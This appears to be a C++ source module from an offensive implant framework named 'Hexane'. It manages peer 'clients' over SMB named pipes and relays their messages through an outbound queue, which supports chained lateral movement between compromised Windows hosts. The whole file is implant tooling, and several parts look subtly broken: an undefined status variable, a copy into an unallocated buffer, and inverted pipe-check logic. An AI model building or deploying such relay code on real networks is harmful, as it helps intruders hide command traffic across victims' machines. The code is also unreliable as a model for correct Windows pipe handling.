#include <core/include/clients.hpp>
namespace Clients {

    _client* GetClient(const uint32_t peer_id) {
        HEXANE

        auto head = Ctx->clients;
        do {
            if (head) {
                if (head->peer_id == peer_id) {
                    return head;
                }
                head = head->next;

            } else {
                return nullptr;
            }
        }
        while (true);
    }

    BOOL RemoveClient(const uint32_t peer_id) {
        HEXANE

        _client *prev       = { };
        _client *head       = Ctx->clients;
        _client *target     = GetClient(peer_id);
        bool success        = true;

        if (!head || !target) {
            success_(false);
        }

        while (head) {
            if (head == target) {
                if (prev) {
                    prev->next = head->next;
                } else {
                    Ctx->clients = head->next;
                }

                if (head->pipe_name) {
                    x_memset(head->pipe_name, 0, x_wcslen(head->pipe_name));
                    x_free(head->pipe_name);
                }

                if (head->pipe_handle) {
                    Ctx->nt.NtClose(head->pipe_handle);
                    head->pipe_handle = nullptr;
                }

                head->peer_id = 0;
                success_(true);
            }

            prev = head;
            head = head->next;
        }

        defer:
        return success;
    }

    BOOL AddClient(const wchar_t *pipe_name, const uint32_t peer_id) {
        HEXANE

        _stream *in     = { };
        _client *client = { };
        _client *head   = { };

        void *handle    = { };
        void *buffer    = { };

        uint32_t total  = 0;
        uint32_t read   = 0;
        bool success    = true;

        // first contact
        if (!(handle = Ctx->win32.CreateFileW(pipe_name, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
            if (handle == INVALID_HANDLE_VALUE) {
                success_(false);
            }

            if (ntstatus == ERROR_PIPE_BUSY) {
                if (!Ctx->win32.WaitNamedPipeW(pipe_name, 5000)) {
                    Ctx->nt.NtClose(handle);
                    success_(false);
                }
            }
        }
        do {
            if (Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, R_CAST(LPDWORD, &total), nullptr)) {
                if (total) {
                    if (!(buffer = x_malloc(total)) || !(in = Stream::CreateStream())) {
                        Ctx->nt.NtClose(handle);
                        success_(false);
                    }

                    if (!Ctx->win32.ReadFile(handle, buffer, total, R_CAST(LPDWORD, &read), nullptr) || read != total) {
                        Ctx->nt.NtClose(handle);
                        success_(false);
                    }

                    in->buffer = B_PTR(buffer);
                    in->length += total;

                    Dispatcher::OutboundQueue(in);
                    break;
                }
            }
        }
        while (true);

        client = R_CAST(_client*, x_malloc(sizeof(_client)));
        client->pipe_handle = handle;

        x_memcpy(&client->peer_id, &peer_id, sizeof(uint32_t));
        x_memcpy(client->pipe_name, pipe_name, x_wcslen(pipe_name) * sizeof(wchar_t));

        if (!Ctx->clients) {
            Ctx->clients = client;

        } else {
            head = Ctx->clients;
            do {
                if (head) {
                    if (head->next) {
                        head = head->next;
                    } else {
                        head->next = client;
                        break;
                    }
                } else {
                    break;
                }
            }
            while (true);
        }

        defer:
        return success;
    }

    VOID PushClients() {
        HEXANE

        for (auto client = Ctx->clients; client; client = client->next) {

            _stream     *in     = { };
            void        *buffer = { };

            uint8_t     bound   = 0;
            uint32_t    total   = 0;
            uint32_t    read    = 0;

            if (Ctx->win32.PeekNamedPipe(client->pipe_handle, &bound, sizeof(uint8_t), nullptr, R_CAST(LPDWORD, &read), nullptr) || read != sizeof(uint8_t)) {
                continue;
            }
            if (!Ctx->win32.PeekNamedPipe(client->pipe_handle, nullptr, 0, nullptr, R_CAST(LPDWORD, &total), nullptr)) {
                continue;
            }

            if (bound == 0 && total >= sizeof(uint32_t)) {

                x_assert(buffer = x_malloc(total));
                x_assert(in     = Stream::CreateStream());

                if (!Ctx->win32.ReadFile(client->pipe_handle, buffer, total, R_CAST(LPDWORD, &read), nullptr) || read != total) {
                    Stream::DestroyStream(in);
                    x_free(buffer);

                    continue;
                }

                in->buffer = B_PTR(buffer);
                in->length += total;

                Dispatcher::OutboundQueue(in);

            } else {
                continue;
            }

            for (auto message = Ctx->transport.outbound_queue; message; message = message->next) {

                if (message->buffer && B_PTR(message->buffer)[0] == 1) {
                    if (Dispatcher::PeekPeerId(message) == client->peer_id) {

                        if (Network::Smb::PipeWrite(client->pipe_handle, message)) {
                            Dispatcher::RemoveMessage(message);
                        }
                    }
                }
            }
        }

        defer:
    }
}
